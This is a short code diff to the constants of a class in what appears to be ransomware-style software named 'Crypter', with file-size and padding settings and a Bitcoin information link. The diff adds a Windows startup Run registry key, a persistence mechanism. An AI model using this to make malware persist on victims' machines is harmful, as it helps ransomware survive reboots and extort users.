@@ -27,6 +27,7 @@ class Base():
     PADDING_BLOCK_SIZE = 16
     MAX_FILE_SIZE_BYTES = 536870912
     REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
+    STARTUP_REGISTRY_LOCATION = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
     RUNTIME_CONFIG_FILE = "runtime.cfg"
     BTC_BUTTON_URL = "https://www.coindesk.com/information/what-is-bitcoin/"
 
